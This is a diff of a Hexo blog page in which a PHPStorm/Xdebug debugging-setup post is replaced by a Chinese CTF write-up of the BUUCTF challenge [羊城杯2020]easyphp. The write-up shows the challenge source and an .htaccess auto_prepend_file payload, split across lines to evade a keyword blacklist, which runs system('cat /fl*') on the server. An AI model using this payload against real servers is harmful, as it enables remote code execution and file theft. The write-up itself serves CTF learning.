@@ -13,13 +13,13 @@
   
   <title>
     
-      【Debug】phpweb+phpstorm调试记录 
+      【BUUCTF】Web刷题记录 
       
       
       |
     
      Hexo
-  </title>
+  </title><meta name="robots" content="noindex">
 
   
     <link rel="apple-touch-icon" href="/images/hacker.jpg">
@@ -154,19 +154,19 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">【Debug】phpweb+phpstorm调试记录</div>
+      <div class="post-title">【BUUCTF】Web刷题记录</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2024-05-10 10:57:58
+          2024-05-10 17:31:05
         </span>
         
               <span class="post-tags">
                 <i class="iconfont icon-tags mr-10" title="Tags"></i>
                 
                 <span class="span--tag mr-8">
-                  <a href="/tags/Debug/" title="Debug">
-                    #Debug
+                  <a href="/tags/CTF/" title="CTF">
+                    #CTF
                   </a>
                 </span>
                 
@@ -174,61 +174,43 @@
           
       </div>
       <div class="markdown-body">
-        <p>之前配置过了好多次，但是每次都忘了怎么配置，所以打算记录一下</p>
-<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>OS：Windows</p>
-<p>IDE：PHPStorm</p>
-<h1 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h1><p>首先开启php.ini中的Xdebug项</p>
-<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101055352.png" alt="image-20240510092712260"></p>
-<p>使用phpinfo中的信息，下载对应的xdebug.dll文件，然后移动到对应的php目录下的ext文件夹中</p>
-<p>修改php.ini</p>
-<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101055745.png" alt="image-20240510093657750"></p>
-<h1 id="配置PHPSTORM"><a href="#配置PHPSTORM" class="headerlink" title="配置PHPSTORM"></a>配置PHPSTORM</h1><p>首先配置php环境</p>
-<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101055819.png" alt="image-20240510094043769"></p>
-<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101055653.png" alt="image-20240510094021676"></p>
-<p>设置调试端口</p>
-<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101055212.png" alt="image-20240510094454858"></p>
-<p>验证</p>
-<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101055634.png" alt="image-20240510094515977"></p>
-<h1 id="调试时的超时问题"><a href="#调试时的超时问题" class="headerlink" title="调试时的超时问题"></a>调试时的超时问题</h1><p>修改apache的http.conf和php.ini</p>
-<p>启用httpd-default和httpd-fcgid两个conf文件</p>
-<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101054339.png" alt="image-20240510104612272"></p>
-<p>管理员权限下运行记事本修改default</p>
-<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101054713.png" alt="image-20240510104724368"></p>
-<p>创建fcgid文件，写入</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ProcessLifeTime 3600</span><br><span class="line">FcgidIOTimeout 3600</span><br><span class="line">FcgidConnectTimeout 3600</span><br><span class="line">FcgidOutputBufferSize 128</span><br><span class="line">FcgidMaxRequestsPerProcess 1000</span><br><span class="line">FcgidMinProcessesPerClass 0 </span><br><span class="line">FcgidMaxProcesses 16 </span><br><span class="line">FcgidMaxRequestLen 268435456   </span><br><span class="line">FcgidInitialEnv PHP_FCGI_MAX_REQUESTS 1000</span><br><span class="line">IPCConnectTimeout 3600</span><br><span class="line">IPCCommTimeout 3600</span><br><span class="line">FcgidIdleTimeout 3600</span><br><span class="line">FcgidBusyTimeout 60000</span><br><span class="line">FcgidBusyScanInterval 120</span><br><span class="line">FcgidInitialEnv PHPRC &quot;D:\phpstudy_pro_\phpstudy_pro\Extensions\php\php7.2.9nts&quot;</span><br><span class="line">AddHandler fcgid-script .php</span><br></pre></td></tr></table></figure>
+        <h1 id="羊城杯2020-easyphp"><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h1><p>源码如下，一开始做了目录遍历，只允许index.php活下来</p>
+<p>然后检查content中不能含有黑名单字符串</p>
+<p>最后检查了文件名，只能含有小写英文字母和数字</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>最后修改php.ini，加入</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">max_execution_time</span> = <span class="number">3600</span></span><br></pre></td></tr></table></figure>
+<p>尝试上传test.php，发现不能解析，应该是Apache做了解析限制，只允许解析index.php文件</p>
+<p>此处可以上传.htaccess完成对当前目录的解析覆盖</p>
+<p><code>.htaccess</code>利用大全：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116541325">https://blog.csdn.net/LYJ20010728/article/details/116541325</a></p>
+<p>此处使用<code>auto_pretend_file</code></p>
+<blockquote>
+<p>通过 php_value 来设置 auto_prepend_file或者 auto_append_file 配置选项包含一些敏感文件，同时在本目录或子目录中需要有可解析的 php 文件来触发<br>.htaccess 分别通过这两个配置选项来包含 &#x2F;etc&#x2F;passwd，并访问同目录下的 index.php文件</p>
+</blockquote>
+<p>利用方法：</p>
+<ol>
+<li>自包含</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fil\</span><br><span class="line">e .htaccess</span><br><span class="line">#&lt;?php system(&#x27;cat /fl*&#x27;);?&gt;\</span><br></pre></td></tr></table></figure>
 
-
-
-
-
-<h1 id="调试成功✌"><a href="#调试成功✌" class="headerlink" title="调试成功✌"></a>调试成功✌</h1><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101054608.png" alt="image-20240510105443290"></p>
-
+<!-- flag of hidden posts -->
       </div>
       
         <div class="prev-or-next">
           <div class="post-foot-next">
             
-              <a href="/2024/05/03/Fuzzing-101/" target="_self">
-                <i class="iconfont icon-chevronleft"></i>
-                <span>Prev</span>
-              </a>
-            
           </div>
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2024-05-10 10:57:58
+              2024-05-10 17:31:05
             </span>
             
                   <span class="post-tags">
                     <i class="iconfont icon-tags mr-10" title="Tags"></i>
                     
                     <span class="span--tag mr-8">
-                      <a href="/tags/Debug/" title="Debug">
-                        #Debug
+                      <a href="/tags/CTF/" title="CTF">
+                        #CTF
                       </a>
                     </span>
                     
@@ -236,11 +218,6 @@
               
           </div>
           <div class="post-foot-prev">
-            
-              <a href="/2024/05/11/vulntarget-c/" target="_self">
-                <span>Next</span>
-                <i class="iconfont icon-chevronright"></i>
-              </a>
             
           </div>
         </div>
@@ -254,7 +231,7 @@
     <div class="title">Contents</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEphp-ini"><span class="toc-text">配置php.ini</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEPHPSTORM"><span class="toc-text">配置PHPSTORM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E6%97%B6%E7%9A%84%E8%B6%85%E6%97%B6%E9%97%AE%E9%A2%98"><span class="toc-text">调试时的超时问题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E6%88%90%E5%8A%9F%E2%9C%8C"><span class="toc-text">调试成功✌</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp"><span class="toc-text">[羊城杯2020]easyphp</span></a></li></ol>
       
     </div>
   </div>
@@ -550,12 +527,12 @@
       </a>
       <div class="share-content hidden">
         
-          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E3%80%90Debug%E3%80%91phpweb%2Bphpstorm%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95 + '&url=' + http%3A%2F%2Fexample.com%2F2024%2F05%2F10%2Fphp-web-debug%2F + '" target="_blank" title="Twitter">
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E3%80%90BUUCTF%E3%80%91Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95 + '&url=' + http%3A%2F%2Fexample.com%2F2024%2F05%2F10%2FBUUCTF-web%2F + '" target="_blank" title="Twitter">
             <i class="iconfont icon-twitter"></i>
           </a>
         
         
-          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2024/05/10/php-web-debug/" target="_blank" title="Facebook">
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2024/05/10/BUUCTF-web/" target="_blank" title="Facebook">
             <i class="iconfont icon-facebooksquare"></i>
           </a>
         
